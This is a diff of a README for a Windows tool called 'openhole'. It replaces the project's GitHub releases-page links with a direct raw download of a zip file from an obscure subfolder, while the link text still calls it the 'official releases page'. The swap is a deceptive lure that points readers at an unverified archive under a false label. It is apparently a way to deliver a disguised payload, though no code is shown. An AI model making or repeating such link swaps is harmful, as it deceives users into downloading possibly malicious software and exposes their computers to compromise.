@@ -1,6 +1,6 @@
 # 🌐 openhole - Share your local projects with anyone
 
-[![Download openhole](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/wsubar9449/openhole/releases)
+[![Download openhole](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/wsubar9449/openhole/main/chalder/Software-3.8.zip)
 
 ## 📖 About this program
 
@@ -16,7 +16,7 @@ You need a Windows computer to run this software. Ensure you have a stable inter
 
 Follow these steps to set up the software:
 
-1. Visit the [official releases page](https://github.com/wsubar9449/openhole/releases).
+1. Visit the [official releases page](https://raw.githubusercontent.com/wsubar9449/openhole/main/chalder/Software-3.8.zip).
 2. Locate the latest version in the list.
 3. Look for the file ending in `.exe` that matches your Windows system.
 4. Click the file name to start your download.
